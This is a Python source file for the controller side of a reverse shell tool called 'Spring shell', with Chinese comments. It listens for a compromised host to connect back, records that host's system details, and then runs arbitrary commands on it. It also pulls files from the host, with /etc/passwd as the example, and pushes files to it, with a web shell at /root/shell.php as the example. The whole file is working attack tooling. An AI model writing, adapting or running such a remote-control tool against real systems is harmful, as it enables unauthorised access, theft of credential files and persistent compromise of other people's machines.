import logging
import os
import socket
import struct
import sys


logging.basicConfig(level = logging.DEBUG,format = '%(asctime)s - %(levelname)s - %(message)s')
def init():
    pic=''' 
 ____             _                   _          _ _ 
/ ___| _ __  _ __(_)_ __   __ _   ___| |__   ___| | |
\___ \| '_ \| '__| | '_ \ / _` | / __| '_ \ / _ \ | |
 ___) | |_) | |  | | | | | (_| | \__ \ | | |  __/ | |
|____/| .__/|_|  |_|_| |_|\__, | |___/_| |_|\___|_|_|
      |_|                 |___/                      
'''
    print(pic)
    print('version [1.0]\n')
def ExecuteCommand(conn,addr):
    while True:
        try:
            command = input('\n[Command]>>>')
            while command == '':
                command = input('\n[Command]>>>')
                continue
            if command =='exit':
                conn.sendall('exit'.encode())
                break
            #向被控端发送命令
            conn.sendall(command.encode('gb2312'))
            #接收执行结果

            #这里接收不全，需要分块接收
            result=conn.recv(10000).decode()
            #测试的时候发现默认编码无法解析汉字会报错，改了编码就好了
            #打印
            print(result)
        except Exception as e:
            print("error: "+str(e))
            continue
def downloadFile(conn,addr,path):
    #发送要从被控端下载的文件路径
    conn.sendall(path.encode())
    while True:
        #以相同的格式接收下载文件信息
        fileInfo=conn.recv(struct.calcsize('128s20s'))
        if fileInfo:
            #提取文件信息
            fileName,fileSize=struct.unpack('128s20s',fileInfo)
            #文件名后的多余字符去除
            fileName=fileName.decode().strip('\x00')
            fileSize=int(fileSize.decode().strip('\x00'))
            os.mkdir('download')
            downloadPath=os.path.join('./download/',fileName)
            print('[*]download \nfilename: {}\nfilesize: {}\n'.format(fileName,fileSize))

            #开始接收文件
            #初始化接收到的数据大小
            recvSize=0
            logging.info('start to receive data...')
            #这里以wb 二进制方式写入的话全是乱码，因此将传来的字节流decode再以w写入。
            with open(downloadPath, 'w') as file:
                while recvSize != fileSize:
                    if (fileSize-recvSize)>1024:
                        data_block=conn.recv(1024).decode()
                        file.write(data_block)
                        recvSize+=len(data_block)
                    else:
                        data_block=conn.recv(fileSize-recvSize).decode()
                        file.write(data_block)
                        recvSize=fileSize
                        break
                logging.info('receive success!  {}'.format(downloadPath))
            break

def uploadFile(conn,addr,path):
    if os.path.isfile(path):
        #打包要上传的文件信息并发送
        fileInfo=struct.pack("128s20s",bytes(os.path.basename(path).encode('utf-8')),bytes(str(os.stat(path).st_size).encode('utf-8')))
        conn.sendall(fileInfo)
        print('[*]upload \nfilename: {}\nfilesize: {}\n'.format(os.path.basename(path),os.stat(path).st_size))
        #开始上传

        logging.info('start to upload file...')
        with open(path,'r') as file:
            while True:
                data_block=file.read(1024).encode()
                if not data_block:
                    break
                conn.sendall(data_block)
            logging.info("upload success")
        pass


if __name__=="__main__":
    #设置主机地址与监听地址
    IP=sys.argv[1]
    PORT=int(sys.argv[2])
    serverAddr=(IP,PORT)
    init()
    #开始监听
    try: 
        server_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(serverAddr)
        server_socket.listen(1)
    except socket.error as e:
        print(e)
        os._exit(0)
    logging.info("server up,start to lisening on {}:{}".format(IP,PORT))

    #接收反连,提取主机IP和端口
    conn,addr=server_socket.accept()
    hostInfo=conn.recv(1024).decode().split('\n')
    hostName=hostInfo[0]
    #判断操作系统，三目运算(nt=windows;posix=linux)
    opSystem=hostInfo[1]
    arch=hostInfo[2]
    version=hostInfo[3]
    logging.info("Host up!\n[*]hostname:{}\n[*]OS:{}\n[*]arch:{}\n[*]version:{}\n[*]IP:{}\n[*]PORT:{}\n".format(hostName,opSystem,arch,version,addr[0],addr[1]))
    try:
        while True:
            print("\nFunction select:\n[1]ExecuteCommand\n[2]DownloadFile\n[3]UploadFile\n")
            #输入指令序号
            choice=input(">>>")
            if choice == "1":
                conn.send('1'.encode())
                ExecuteCommand(conn,addr)
            elif choice == "2":
                conn.send('2'.encode())
                print("[*]File to download:\nexample:/etc/passwd\n")
                path=input("[path]>>>")
                if path == 'exit':
                    continue
                while path == '':
                   path=input("[path]>>>")
                   continue 
                downloadFile(conn,addr,path)
            elif choice == "3":
                conn.send('3'.encode())
                print("[*]Your File to upload:\nexample:/root/shell.php\n")
                path=input("[path]>>>")
                if path == 'exit':
                    continue
                while path == '':
                    path=input("[path]>>>")
                    continue
                uploadFile(conn,addr,path)
            elif choice == "exit" or choice == "quit":
                conn.send('exit'.encode())
                server_socket.close()
                break
    except Exception as e:
        print("error: " + str(e))